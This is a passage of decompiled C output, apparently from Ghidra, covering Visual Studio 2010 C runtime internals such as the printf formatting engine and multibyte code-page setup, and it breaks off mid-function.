void __fastcall _write_string(int param_1,undefined param_2,undefined4 param_3)

{
  int iVar1;
  int *in_EAX;
  int *piVar2;
  FILE *unaff_EDI;
  
  piVar2 = __errno();
  iVar1 = *piVar2;
  if (((*(byte *)&unaff_EDI->_flag & 0x40) == 0) || (unaff_EDI->_base != (char *)0x0)) {
    piVar2 = __errno();
    *piVar2 = 0;
    while (0 < param_1) {
      param_1 = param_1 + -1;
      _write_char(unaff_EDI);
      if (*in_EAX == -1) {
        piVar2 = __errno();
        if (*piVar2 != 0x2a) break;
        _write_char(unaff_EDI);
      }
    }
    piVar2 = __errno();
    if (*piVar2 == 0) {
      piVar2 = __errno();
      *piVar2 = iVar1;
    }
  }
  else {
    *in_EAX = *in_EAX + param_1;
  }
  return;
}



// WARNING: Type propagation algorithm not settling
// WARNING: Could not reconcile some variable overlaps
// Library Function - Single Match
//  __output_s_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __output_s_l(FILE *_File,char *_Format,_locale_t _Locale,va_list _ArgList)

{
  char cVar1;
  FILE *pFVar2;
  int *piVar3;
  uint uVar4;
  uint uVar5;
  code *pcVar6;
  errno_t eVar7;
  int iVar8;
  undefined *puVar9;
  int extraout_ECX;
  byte bVar10;
  undefined uVar11;
  undefined *extraout_EDX;
  uint extraout_EDX_00;
  undefined *puVar12;
  uint extraout_EDX_01;
  uint extraout_EDX_02;
  uint extraout_EDX_03;
  uint extraout_EDX_04;
  uint extraout_EDX_05;
  undefined4 extraout_EDX_07;
  undefined4 uVar13;
  uint extraout_EDX_08;
  uint extraout_EDX_09;
  uint extraout_EDX_10;
  uint extraout_EDX_11;
  uint extraout_EDX_12;
  int *piVar14;
  size_t sVar15;
  byte *pbVar16;
  bool bVar17;
  undefined8 uVar18;
  int *piVar19;
  int *piVar20;
  localeinfo_struct *plVar21;
  int *in_stack_fffffd84;
  int local_274;
  undefined4 local_270;
  int *local_268;
  int local_264;
  int local_260;
  FILE *local_25c;
  int *local_258;
  localeinfo_struct local_254;
  int local_24c;
  char local_248;
  uint local_244;
  byte *local_240;
  int local_23c;
  int *local_238;
  int local_234;
  undefined local_230;
  char local_22f;
  int **local_22c;
  int local_228;
  size_t local_224;
  int *local_220;
  int *local_21c;
  byte local_215;
  uint local_214;
  int local_210 [127];
  undefined4 local_11;
  uint local_8;
  undefined4 extraout_EDX_06;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_25c = _File;
  local_22c = (int **)_ArgList;
  local_264 = 0;
  local_214 = 0;
  local_238 = (int *)0x0;
  local_21c = (int *)0x0;
  local_234 = 0;
  local_260 = 0;
  local_23c = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_254,_Locale);
  uVar11 = SUB41(in_stack_fffffd84,0);
  if (_File != (FILE *)0x0) {
    puVar12 = extraout_EDX;
    if ((*(byte *)&_File->_flag & 0x40) == 0) {
      uVar4 = __fileno(_File);
      uVar11 = SUB41(in_stack_fffffd84,0);
      puVar12 = &DAT_003d6e00;
      if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
        puVar9 = &DAT_003d6e00;
      }
      else {
        puVar9 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_003ea060)[(int)uVar4 >> 5]);
      }
      if ((puVar9[0x24] & 0x7f) == 0) {
        if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
          puVar9 = &DAT_003d6e00;
        }
        else {
          puVar9 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_003ea060)[(int)uVar4 >> 5]);
        }
        if ((puVar9[0x24] & 0x80) == 0) goto LAB_003b62aa;
      }
    }
    else {
LAB_003b62aa:
      uVar11 = SUB41(in_stack_fffffd84,0);
      if (_Format != (char *)0x0) {
        local_215 = *_Format;
        uVar4 = (uint)puVar12 & 0xffffff00 | (uint)local_215;
        local_228 = 0;
        local_224 = 0;
        local_244 = 0;
        local_258 = (int *)0x0;
        if (local_215 != 0) {
          while( true ) {
            uVar11 = SUB41(in_stack_fffffd84,0);
            pbVar16 = (byte *)_Format + 1;
            local_240 = pbVar16;
            if (local_228 < 0) break;
            cVar1 = (char)uVar4;
            if ((byte)(cVar1 - 0x20U) < 0x59) {
              uVar5 = (byte)(&DAT_003c7d30)[cVar1] & 0xf;
            }
            else {
              uVar5 = 0;
            }
            local_244 = (uint)((byte)(&DAT_003c7d50)[local_244 + uVar5 * 9] >> 4);
            switch(local_244) {
            case 0:
switchD_003b6337_caseD_0:
              local_23c = 0;
              iVar8 = __isleadbyte_l(uVar4 & 0xff,(_locale_t)&local_254);
              if (iVar8 != 0) {
                _write_char(local_25c);
                uVar11 = SUB41(in_stack_fffffd84,0);
                local_240 = (byte *)_Format + 2;
                if (*pbVar16 == 0) goto switchD_003b6337_caseD_9;
              }
              _write_char(local_25c);
              uVar4 = extraout_EDX_01;
              break;
            case 1:
              local_21c = (int *)0xffffffff;
              local_270 = 0;
              local_260 = 0;
              local_238 = (int *)0x0;
              local_234 = 0;
              local_214 = 0;
              local_23c = 0;
              break;
            case 2:
              if (cVar1 == ' ') {
                local_214 = local_214 | 2;
              }
              else {
                if (cVar1 == '#') {
                  local_214 = local_214 | 0x80;
                }
                else {
                  if (cVar1 == '+') {
                    local_214 = local_214 | 1;
                  }
                  else {
                    if (cVar1 == '-') {
                      local_214 = local_214 | 4;
                    }
                    else {
                      if (cVar1 == '0') {
                        local_214 = local_214 | 8;
                      }
                    }
                  }
                }
              }
              break;
            case 3:
              if (cVar1 == '*') {
                local_22c = (int **)((int)_ArgList + 4);
                local_238 = *(int **)_ArgList;
                if ((int)local_238 < 0) {
                  local_214 = local_214 | 4;
                  local_238 = (int *)-(int)local_238;
                }
              }
              else {
                local_238 = (int *)((int)local_238 * 10 + -0x30 + (int)cVar1);
              }
              break;
            case 4:
              local_21c = (int *)0x0;
              break;
            case 5:
              if (cVar1 == '*') {
                local_22c = (int **)((int)_ArgList + 4);
                local_21c = *(int **)_ArgList;
                if ((int)local_21c < 0) {
                  local_21c = (int *)0xffffffff;
                }
              }
              else {
                local_21c = (int *)((int)local_21c * 10 + -0x30 + (int)cVar1);
              }
              break;
            case 6:
              if (cVar1 == 'I') {
                bVar10 = *pbVar16;
                if ((bVar10 == 0x36) && (((byte *)_Format)[2] == 0x34)) {
                  local_214 = local_214 | 0x8000;
                  local_240 = (byte *)_Format + 3;
                }
                else {
                  if ((bVar10 == 0x33) && (((byte *)_Format)[2] == 0x32)) {
                    local_214 = local_214 & 0xffff7fff;
                    local_240 = (byte *)_Format + 3;
                  }
                  else {
                    if (((((bVar10 != 100) && (bVar10 != 0x69)) && (bVar10 != 0x6f)) &&
                        ((bVar10 != 0x75 && (bVar10 != 0x78)))) && (bVar10 != 0x58)) {
                      local_244 = 0;
                      goto switchD_003b6337_caseD_0;
                    }
                  }
                }
              }
              else {
                if (cVar1 == 'h') {
                  local_214 = local_214 | 0x20;
                }
                else {
                  if (cVar1 == 'l') {
                    if (*pbVar16 == 0x6c) {
                      local_214 = local_214 | 0x1000;
                      local_240 = (byte *)_Format + 2;
                    }
                    else {
                      local_214 = local_214 | 0x10;
                    }
                  }
                  else {
                    if (cVar1 == 'w') {
                      local_214 = local_214 | 0x800;
                    }
                  }
                }
              }
              break;
            case 7:
              if (cVar1 < 'e') {
                if (cVar1 == 'd') {
LAB_003b6825:
                  local_214 = local_214 | 0x40;
LAB_003b682c:
                  local_224 = 10;
LAB_003b6836:
                  if (((local_214 & 0x8000) == 0) && ((local_214 & 0x1000) == 0)) {
                    local_22c = (int **)((int)_ArgList + 4);
                    if ((local_214 & 0x20) == 0) {
                      piVar3 = *(int **)_ArgList;
                      if ((local_214 & 0x40) == 0) {
                        piVar14 = (int *)0x0;
                      }
                      else {
                        piVar14 = (int *)((int)piVar3 >> 0x1f);
                      }
                    }
                    else {
                      if ((local_214 & 0x40) == 0) {
                        piVar3 = (int *)(uint)*(ushort *)_ArgList;
                      }
                      else {
                        piVar3 = (int *)(int)*(short *)_ArgList;
                      }
                      piVar14 = (int *)((int)piVar3 >> 0x1f);
                    }
                  }
                  else {
                    local_22c = (int **)((int)_ArgList + 8);
                    piVar3 = *(int **)_ArgList;
                    piVar14 = *(int **)((int)_ArgList + 4);
                  }
                  if ((((local_214 & 0x40) != 0) && ((int)piVar14 < 1)) && ((int)piVar14 < 0)) {
                    bVar17 = piVar3 != (int *)0x0;
                    piVar3 = (int *)-(int)piVar3;
                    piVar14 = (int *)-(int)((int)piVar14 + (uint)bVar17);
                    local_214 = local_214 | 0x100;
                  }
                  uVar18 = CONCAT44(piVar14,piVar3);
                  if ((local_214 & 0x9000) == 0) {
                    piVar14 = (int *)0x0;
                  }
                  if ((int)local_21c < 0) {
                    local_21c = (int *)0x1;
                  }
                  else {
                    local_214 = local_214 & 0xfffffff7;
                    if (0x200 < (int)local_21c) {
                      local_21c = (int *)0x200;
                    }
                  }
                  if (((uint)piVar3 | (uint)piVar14) == 0) {
                    local_234 = 0;
                  }
                  piVar3 = &local_11;
                  while( true ) {
                    piVar19 = piVar14;
                    uVar4 = (uint)((ulonglong)uVar18 >> 0x20);
                    piVar14 = (int *)((int)local_21c + -1);
                    if (((int)local_21c < 1) && (((uint)uVar18 | (uint)piVar19) == 0)) break;
                    local_21c = piVar14;
                    uVar18 = __aulldvrm((uint)uVar18,(uint)piVar19,local_224,(int)local_224 >> 0x1f)
                    ;
                    iVar8 = extraout_ECX + 0x30;
                    if (0x39 < iVar8) {
                      iVar8 = iVar8 + local_264;
                    }
                    *(char *)piVar3 = (char)iVar8;
                    piVar3 = (int *)((int)piVar3 + -1);
                    piVar14 = (int *)((ulonglong)uVar18 >> 0x20);
                    local_268 = piVar19;
                  }
                  local_224 = (int)&local_11 + -(int)piVar3;
                  local_220 = (int *)((int)piVar3 + 1);
                  local_21c = piVar14;
                  if (((local_214 & 0x200) != 0) &&
                     ((local_224 == 0 || (*(char *)local_220 != '0')))) {
                    *(char *)piVar3 = '0';
                    local_224 = (int)&local_11 + -(int)piVar3 + 1;
                    local_220 = piVar3;
                  }
                }
                else {
                  if (cVar1 < 'T') {
                    if (cVar1 == 'S') {
                      if ((local_214 & 0x830) == 0) {
                        local_214 = local_214 | 0x800;
                      }
                      goto LAB_003b6654;
                    }
                    if (cVar1 == 'A') {
LAB_003b65d2:
                      local_215 = cVar1 + 0x20;
                      uVar4 = (uint)local_215;
                      local_270 = 1;
LAB_003b65e5:
                      bVar10 = (byte)uVar4;
                      local_214 = local_214 | 0x40;
                      local_268 = (int *)0x200;
                      piVar3 = local_210;
                      piVar14 = local_268;
                      piVar19 = local_210;
                      if ((int)local_21c < 0) {
                        local_21c = (int *)0x6;
                      }
                      else {
                        if (local_21c == (int *)0x0) {
                          if (bVar10 == 0x67) {
                            local_21c = (int *)0x1;
                          }
                        }
                        else {
                          if (0x200 < (int)local_21c) {
                            local_21c = (int *)0x200;
                          }
                          if (0xa3 < (int)local_21c) {
                            piVar14 = (int *)((int)local_21c + 0x15d);
                            local_220 = local_210;
                            local_258 = (int *)__malloc_crt((size_t)piVar14);
                            piVar3 = local_258;
                            bVar10 = local_215;
                            piVar19 = local_258;
                            if (local_258 == (int *)0x0) {
                              local_21c = (int *)0xa3;
                              piVar3 = local_210;
                              piVar14 = local_268;
                              piVar19 = local_220;
                            }
                          }
                        }
                      }
                      local_220 = piVar19;
                      local_268 = piVar14;
                      in_stack_fffffd84 = *(int **)_ArgList;
                      local_22c = (int **)((int)_ArgList + 8);
                      plVar21 = &local_254;
                      iVar8 = (int)(char)bVar10;
                      puVar12 = &stack0xfffffd84;
                      piVar14 = piVar3;
                      piVar19 = local_268;
                      piVar20 = local_21c;
                      uVar13 = local_270;
                      pcVar6 = (code *)DecodePointer(Ptr_003d70e8);
                      (*pcVar6)(puVar12,piVar14,piVar19,iVar8,piVar20,uVar13,plVar21);
                      uVar4 = local_214 & 0x80;
                      if ((uVar4 != 0) && (local_21c == (int *)0x0)) {
                        plVar21 = &local_254;
                        piVar14 = piVar3;
                        pcVar6 = (code *)DecodePointer(Ptr_003d70f4);
                        (*pcVar6)(piVar14,plVar21);
                      }
                      if ((local_215 == 0x67) && (uVar4 == 0)) {
                        plVar21 = &local_254;
                        piVar14 = piVar3;
                        pcVar6 = (code *)DecodePointer(Ptr_003d70f0);
                        (*pcVar6)(piVar14,plVar21);
                      }
                      if (*(char *)piVar3 == '-') {
                        local_214 = local_214 | 0x100;
                        piVar3 = (int *)((int)piVar3 + 1);
                        local_220 = piVar3;
                      }
LAB_003b6787:
                      local_224 = _strlen((char *)piVar3);
                      uVar4 = extraout_EDX_03;
                    }
                    else {
                      if (cVar1 == 'C') {
                        if ((local_214 & 0x830) == 0) {
                          local_214 = local_214 | 0x800;
                        }
LAB_003b66c7:
                        local_22c = (int **)((int)_ArgList + 4);
                        if ((local_214 & 0x810) == 0) {
                          local_210[0]._0_1_ = *_ArgList;
                          local_224 = 1;
                        }
                        else {
                          eVar7 = _wctomb_s((int *)&local_224,(char *)local_210,0x200,
                                            *(wchar_t *)_ArgList);
                          uVar4 = extraout_EDX_02;
                          if (eVar7 != 0) {
                            local_260 = 1;
                          }
                        }
                        local_220 = local_210;
                      }
                      else {
                        if ((cVar1 == 'E') || (cVar1 == 'G')) goto LAB_003b65d2;
                      }
                    }
                  }
                  else {
                    if (cVar1 == 'X') goto LAB_003b697f;
                    if (cVar1 == 'Z') {
                      piVar3 = *(int **)_ArgList;
                      local_22c = (int **)((int)_ArgList + 4);
                      if ((piVar3 == (int *)0x0) ||
                         (local_220 = (int *)piVar3[1], local_220 == (int *)0x0)) {
                        local_220 = (int *)PTR_s__null__003d666c;
                        piVar3 = (int *)PTR_s__null__003d666c;
                        goto LAB_003b6787;
                      }
                      local_224 = SEXT24(*(wchar_t *)piVar3);
                      if ((local_214 & 0x800) == 0) {
                        local_23c = 0;
                      }
                      else {
                        uVar4 = (int)local_224 >> 0x1f;
                        local_224 = (int)local_224 / 2;
                        local_23c = 1;
                      }
                    }
                    else {
                      if (cVar1 == 'a') goto LAB_003b65e5;
                      if (cVar1 == 'c') goto LAB_003b66c7;
                    }
                  }
                }
LAB_003b6b59:
                if (local_260 == 0) {
                  if ((local_214 & 0x40) != 0) {
                    if ((local_214 & 0x100) == 0) {
                      if ((local_214 & 1) == 0) {
                        if ((local_214 & 2) == 0) goto LAB_003b6ba2;
                        local_230 = 0x20;
                      }
                      else {
                        local_230 = 0x2b;
                      }
                    }
                    else {
                      local_230 = 0x2d;
                    }
                    local_234 = 1;
                  }
LAB_003b6ba2:
                  piVar14 = (int *)((int)local_238 + (-local_234 - local_224));
                  local_268 = piVar14;
                  piVar3 = piVar14;
                  if ((local_214 & 0xc) == 0) {
                    do {
                      if ((int)piVar3 < 1) break;
                      piVar3 = (int *)((int)piVar3 + -1);
                      _write_char(local_25c);
                      uVar4 = extraout_EDX_05;
                    } while (local_228 != -1);
                  }
                  pFVar2 = local_25c;
                  _write_string(local_234,(char)uVar4,&local_230);
                  uVar11 = (undefined)extraout_EDX_06;
                  if (((local_214 & 8) != 0) && (uVar13 = extraout_EDX_06, (local_214 & 4) == 0)) {
                    do {
                      uVar11 = (undefined)uVar13;
                      if ((int)piVar14 < 1) break;
                      piVar14 = (int *)((int)piVar14 + -1);
                      _write_char(pFVar2);
                      uVar11 = (undefined)extraout_EDX_07;
                      uVar13 = extraout_EDX_07;
                    } while (local_228 != -1);
                  }
                  if ((local_23c == 0) ||
                     (sVar15 = local_224, piVar3 = local_220, (int)local_224 < 1)) {
                    _write_string(local_224,uVar11,local_220);
                    uVar4 = extraout_EDX_10;
                  }
                  else {
                    do {
                      sVar15 = sVar15 - 1;
                      eVar7 = _wctomb_s(&local_274,(char *)((int)&local_11 + 1),6,*(wchar_t *)piVar3
                                       );
                      if ((eVar7 != 0) || (local_274 == 0)) {
                        local_228 = -1;
                        uVar4 = extraout_EDX_08;
                        break;
                      }
                      _write_string(local_274,(char)extraout_EDX_08,(int)&local_11 + 1);
                      uVar4 = extraout_EDX_09;
                      piVar3 = (int *)((int)piVar3 + 2);
                    } while (sVar15 != 0);
                  }
                  if ((-1 < local_228) && (piVar3 = local_268, (local_214 & 4) != 0)) {
                    do {
                      if ((int)piVar3 < 1) break;
                      _write_char(pFVar2);
                      uVar4 = extraout_EDX_11;
                      piVar3 = (int *)((int)piVar3 + -1);
                    } while (local_228 != -1);
                  }
                }
              }
              else {
                if ('p' < cVar1) {
                  if (cVar1 == 's') {
LAB_003b6654:
                    piVar3 = local_21c;
                    if (local_21c == (int *)0xffffffff) {
                      piVar3 = (int *)0x7fffffff;
                    }
                    local_22c = (int **)((int)_ArgList + 4);
                    local_220 = *(int **)_ArgList;
                    if ((local_214 & 0x810) == 0) {
                      piVar14 = local_220;
                      if (local_220 == (int *)0x0) {
                        local_220 = (int *)PTR_s__null__003d666c;
                        piVar14 = (int *)PTR_s__null__003d666c;
                      }
                      for (; (piVar3 != (int *)0x0 &&
                             (piVar3 = (int *)((int)piVar3 + -1), *(char *)piVar14 != '\0'));
                          piVar14 = (int *)((int)piVar14 + 1)) {
                      }
                      local_224 = (int)piVar14 - (int)local_220;
                    }
                    else {
                      if (local_220 == (int *)0x0) {
                        local_220 = (int *)PTR_u__null__003d6670;
                      }
                      local_23c = 1;
                      for (piVar14 = local_220;
                          (piVar3 != (int *)0x0 &&
                          (piVar3 = (int *)((int)piVar3 + -1), *(wchar_t *)piVar14 != L'\0'));
                          piVar14 = (int *)((int)piVar14 + 2)) {
                      }
                      local_224 = (int)piVar14 - (int)local_220 >> 1;
                    }
                    goto LAB_003b6b59;
                  }
                  if (cVar1 == 'u') goto LAB_003b682c;
                  if (cVar1 != 'x') goto LAB_003b6b59;
                  local_264 = 0x27;
LAB_003b69ab:
                  local_224 = 0x10;
                  if ((local_214 & 0x80) != 0) {
                    local_22f = (char)local_264 + 'Q';
                    local_230 = 0x30;
                    local_234 = 2;
                  }
                  goto LAB_003b6836;
                }
                if (cVar1 == 'p') {
                  local_21c = (int *)&DAT_00000008;
LAB_003b697f:
                  local_264 = 7;
                  goto LAB_003b69ab;
                }
                if (cVar1 < 'e') goto LAB_003b6b59;
                if (cVar1 < 'h') goto LAB_003b65e5;
                if (cVar1 == 'i') goto LAB_003b6825;
                if (cVar1 != 'n') {
                  if (cVar1 != 'o') goto LAB_003b6b59;
                  local_224 = 8;
                  if ((local_214 & 0x80) != 0) {
                    local_214 = local_214 | 0x200;
                  }
                  goto LAB_003b6836;
                }
                piVar3 = *(int **)_ArgList;
                local_22c = (int **)((int)_ArgList + 4);
                iVar8 = __get_printf_count_output();
                uVar11 = SUB41(in_stack_fffffd84,0);
                if (iVar8 == 0) goto switchD_003b6337_caseD_9;
                if ((local_214 & 0x20) == 0) {
                  *piVar3 = local_228;
                }
                else {
                  *(wchar_t *)piVar3 = (wchar_t)local_228;
                }
                local_260 = 1;
                uVar4 = extraout_EDX_04;
              }
              if (local_258 != (int *)0x0) {
                _free(local_258);
                local_258 = (int *)0x0;
                uVar4 = extraout_EDX_12;
              }
              break;
            default:
              goto switchD_003b6337_caseD_9;
            case 0xbad1abe1:
              break;
            }
            uVar11 = SUB41(in_stack_fffffd84,0);
            local_215 = *local_240;
            if (local_215 == 0) break;
            uVar4 = uVar4 & 0xffffff00 | (uint)local_215;
            _ArgList = (va_list)local_22c;
            _Format = (char *)local_240;
          }
          if ((local_244 != 0) && (local_244 != 7)) goto switchD_003b6337_caseD_9;
        }
        if (local_248 != '\0') {
          *(uint *)(local_24c + 0x70) = *(uint *)(local_24c + 0x70) & 0xfffffffd;
        }
        goto LAB_003b6d4f;
      }
    }
  }
switchD_003b6337_caseD_9:
  piVar3 = __errno();
  *piVar3 = 0x16;
  FUN_003b60f9();
  uVar4 = extraout_EDX_00;
  if (local_248 != '\0') {
    *(uint *)(local_24c + 0x70) = *(uint *)(local_24c + 0x70) & 0xfffffffd;
  }
LAB_003b6d4f:
  iVar8 = terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar4,uVar11);
  return iVar8;
}



// Library Function - Single Match
//  int __cdecl CPtoLCID(int)
// 
// Library: Visual Studio 2010 Release

int __cdecl CPtoLCID(int param_1)

{
  int in_EAX;
  
  if (in_EAX == 0x3a4) {
    return 0x411;
  }
  if (in_EAX == 0x3a8) {
    return 0x804;
  }
  if (in_EAX == 0x3b5) {
    return 0x412;
  }
  if (in_EAX != 0x3b6) {
    return 0;
  }
  return 0x404;
}



// Library Function - Single Match
//  void __cdecl setSBCS(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2010 Release

void __cdecl setSBCS(threadmbcinfostruct *param_1)

{
  int in_EAX;
  undefined *puVar1;
  int iVar2;
  
  trim_string((undefined (*) [16])(in_EAX + 0x1c),0,0x101);
  *(undefined4 *)(in_EAX + 4) = 0;
  *(undefined4 *)(in_EAX + 8) = 0;
  *(undefined4 *)(in_EAX + 0xc) = 0;
  *(undefined4 *)(in_EAX + 0x10) = 0;
  *(undefined4 *)(in_EAX + 0x14) = 0;
  *(undefined4 *)(in_EAX + 0x18) = 0;
  puVar1 = (undefined *)(in_EAX + 0x1c);
  iVar2 = 0x101;
  do {
    *puVar1 = puVar1[(int)&DAT_003d6678 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  puVar1 = (undefined *)(in_EAX + 0x11d);
  iVar2 = 0x100;
  do {
    *puVar1 = puVar1[(int)&DAT_003d6678 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  return;
}



// Library Function - Single Match
//  void __cdecl setSBUpLow(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2010 Release

void __cdecl setSBUpLow(threadmbcinfostruct *param_1)

{
  undefined *puVar1;
  BOOL BVar2;
  uint uVar3;
  CHAR CVar4;
  undefined *extraout_EDX;
  undefined *puVar5;
  byte *pbVar6;
  int unaff_ESI;
  int in_stack_fffffae0;
  _cpinfo local_51c;
  WORD local_508 [256];
  CHAR local_308 [256];
  CHAR local_208 [256];
  CHAR local_108 [256];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  BVar2 = GetCPInfo(*(UINT *)(unaff_ESI + 4),(LPCPINFO)&local_51c);
  if (BVar2 == 0) {
    uVar3 = 0;
    in_stack_fffffae0 = -0x61 - (unaff_ESI + 0x11d);
    do {
      puVar1 = (undefined *)(unaff_ESI + 0x11d + uVar3);
      puVar5 = puVar1 + in_stack_fffffae0;
      if (puVar5 + 0x20 < (undefined *)0x1a) {
        pbVar6 = (byte *)(unaff_ESI + 0x1d + uVar3);
        *pbVar6 = *pbVar6 | 0x10;
        puVar5 = (undefined *)(uVar3 + 0x20);
LAB_003b6f89:
        *puVar1 = (char)puVar5;
      }
      else {
        if (puVar5 < (undefined *)0x1a) {
          pbVar6 = (byte *)(unaff_ESI + 0x1d + uVar3);
          *pbVar6 = *pbVar6 | 0x20;
          puVar5 = (undefined *)(uVar3 - 0x20);
          goto LAB_003b6f89;
        }
        *puVar1 = 0;
      }
      uVar3 = uVar3 + 1;
    } while (uVar3 < 0x100);
  }
  else {
    uVar3 = 0;
    do {
      local_108[uVar3] = (CHAR)uVar3;
      uVar3 = uVar3 + 1;
    } while (uVar3 < 0x100);
    local_108[0] = ' ';
    if (local_51c.LeadByte[0] != 0) {
      pbVar6 = local_51c.LeadByte + 1;
      do {
        uVar3 = (uint)local_51c.LeadByte[0];
        if (uVar3 <= *pbVar6) {
          trim_string((undefined (*) [16])(local_108 + uVar3),0x20,(*pbVar6 - uVar3) + 1);
        }
        local_51c.LeadByte[0] = pbVar6[1];
        pbVar6 = pbVar6 + 2;
      } while (local_51c.LeadByte[0] != 0);
    }
    ___crtGetStringTypeA
              ((_locale_t)0x0,1,local_108,0x100,local_508,*(int *)(unaff_ESI + 4),
               *(BOOL *)(unaff_ESI + 0xc));
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x100,local_108,0x100,local_208,
                       0x100,*(int *)(unaff_ESI + 4),0);
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x200,local_108,0x100,local_308,
                       0x100,*(int *)(unaff_ESI + 4),0);
    uVar3 = 0;
    do {
      if ((local_508[uVar3] & 1) == 0) {
        if ((local_508[uVar3] & 2) != 0) {
          pbVar6 = (byte *)(unaff_ESI + 0x1d + uVar3);
          *pbVar6 = *pbVar6 | 0x20;
          CVar4 = local_308[uVar3];
          goto LAB_003b6f2c;
        }
        *(undefined *)(unaff_ESI + 0x11d + uVar3) = 0;
      }
      else {
        pbVar6 = (byte *)(unaff_ESI + 0x1d + uVar3);
        *pbVar6 = *pbVar6 | 0x10;
        CVar4 = local_208[uVar3];
LAB_003b6f2c:
        *(CHAR *)(unaff_ESI + 0x11d + uVar3) = CVar4;
      }
      uVar3 = uVar3 + 1;
      puVar5 = extraout_EDX;
    } while (uVar3 < 0x100);
  }
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,puVar5,(char)in_stack_fffffae0);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetmbcinfo
// 
// Library: Visual Studio 2010 Release

pthreadmbcinfo __cdecl ___updatetmbcinfo(void)

{
  _ptiddata p_Var1;
  LONG LVar2;
  pthreadmbcinfo lpAddend;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_003d6b98) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xd);
    lpAddend = p_Var1->ptmbcinfo;
    if (lpAddend != (pthreadmbcinfo)lpAddend_003d6aa0) {
      if (lpAddend != (pthreadmbcinfo)0x0) {
        LVar2 = InterlockedDecrement(&lpAddend->refcount);
        if ((LVar2 == 0) && (lpAddend != (pthreadmbcinfo)&DAT_003d6678)) {
          _free(lpAddend);
        }
      }
      p_Var1->ptmbcinfo = (pthreadmbcinfo)lpAddend_003d6aa0;
      lpAddend = (pthreadmbcinfo)lpAddend_003d6aa0;
      InterlockedIncrement((LONG *)lpAddend_003d6aa0);
    }
    FUN_003b7040();
  }
  else {
    lpAddend = p_Var1->ptmbcinfo;
  }
  if (lpAddend == (pthreadmbcinfo)0x0) {
    __amsg_exit(0x20);
  }
  return lpAddend;
}



void FUN_003b7040(void)

{
  FUN_003b8677(0xd);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  int __cdecl getSystemCP(int)
// 
// Library: Visual Studio 2010 Release

int __cdecl getSystemCP(int param_1)

{
  UINT UVar1;
  UINT unaff_ESI;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,(localeinfo_struct *)0x0);
  _DAT_003d869c = 0;
  if (unaff_ESI == 0xfffffffe) {
    _DAT_003d869c = 1;
    UVar1 = GetOEMCP();
  }
  else {
    if (unaff_ESI == 0xfffffffd) {
      _DAT_003d869c = 1;
      UVar1 = GetACP();
    }
    else {
      if (unaff_ESI != 0xfffffffc) {
        if (local_8 == '\0') {
          _DAT_003d869c = 0;
          return unaff_ESI;
        }
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        return unaff_ESI;
      }
      UVar1 = *(UINT *)(local_14[0] + 4);
      _DAT_003d869c = 1;
    }
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return UVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __setmbcp_nolock
// 
// Library: Visual Studio 2010 Release

void __cdecl __setmbcp_nolock(undefined4 param_1,int param_2)

{
  byte *pbVar1;
  byte bVar2;
  uint uVar3;
  uint uVar4;
  BOOL BVar5;
  undefined2 *puVar6;
  byte *pbVar7;
  int extraout_ECX;
  undefined2 *puVar8;
  int iVar9;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  undefined4 uVar10;
  threadmbcinfostruct *unaff_EDI;
  uint uVar11;
  undefined in_stack_ffffffdc;
  byte *local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  uVar3 = getSystemCP((int)unaff_EDI);
  if (uVar3 != 0) {
    local_20 = (byte *)0x0;
    uVar4 = 0;
LAB_003b7103:
    if (*(uint *)((int)&DAT_003d6aa8 + uVar4) != uVar3) goto code_r0x003b710f;
    trim_string((undefined (*) [16])(param_2 + 0x1c),0,0x101);
    uVar4 = 0;
    pbVar7 = &DAT_003d6ab8 + (int)local_20 * 0x30;
    local_20 = pbVar7;
    do {
      for (; (*pbVar7 != 0 && (bVar2 = pbVar7[1], bVar2 != 0)); pbVar7 = pbVar7 + 2) {
        for (uVar11 = (uint)*pbVar7; uVar11 <= bVar2; uVar11 = uVar11 + 1) {
          pbVar1 = (byte *)(param_2 + 0x1d + uVar11);
          *pbVar1 = *pbVar1 | (&DAT_003d6aa4)[uVar4];
          bVar2 = pbVar7[1];
        }
      }
      uVar4 = uVar4 + 1;
      pbVar7 = local_20 + 8;
      local_20 = pbVar7;
    } while (uVar4 < 4);
    *(uint *)(param_2 + 4) = uVar3;
    *(undefined4 *)(param_2 + 8) = 1;
    iVar9 = CPtoLCID((int)unaff_EDI);
    in_stack_ffffffdc = (undefined)uVar4;
